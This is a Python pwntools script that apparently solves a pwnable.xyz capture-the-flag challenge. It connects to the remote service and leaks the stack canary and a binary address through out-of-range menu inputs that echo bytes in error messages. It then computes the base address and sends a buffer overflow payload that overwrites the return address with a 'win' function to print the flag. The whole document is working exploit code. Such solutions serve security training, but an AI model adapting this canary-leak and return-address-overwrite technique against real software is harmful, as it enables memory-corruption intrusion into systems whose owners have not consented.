from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30017)
# gdb.attach(p, '''b *0x555555554b15
# b *0x0000555555554b2b''')

p.sendlineafter('Message: ', 'AAAABBBBCCCCDDDD')

canary_leak = '\x00'
for i in range(7):
	p.sendlineafter('> ', p8(0x30+11+i))
	p.recvuntil('Error: ')
	canary_leak += p8(int(p.recvuntil(' ')[:-1]))

print (hex(u64(canary_leak)))

binary_leak = ''
for i in range(6):
	p.sendlineafter('> ', p8(0x30+26+i))
	p.recvuntil('Error: ')
	binary_leak += p8(int(p.recvuntil(' ')[:-1]))

print (hex(u64(binary_leak + '\x00'*2)))	
binary_base = u64(binary_leak + '\x00'*2) - 0xb30
win = binary_base + 0xaac

exploit = ''
exploit += 'A'*0x28
exploit += canary_leak
exploit += 'B'*0x8
exploit += p64(win)

p.sendlineafter('> ', '1')
p.sendlineafter('Message: ', exploit)
p.sendlineafter('> ', '0')
print p.recvuntil('}')

# Might have to run it a couple of times ;)

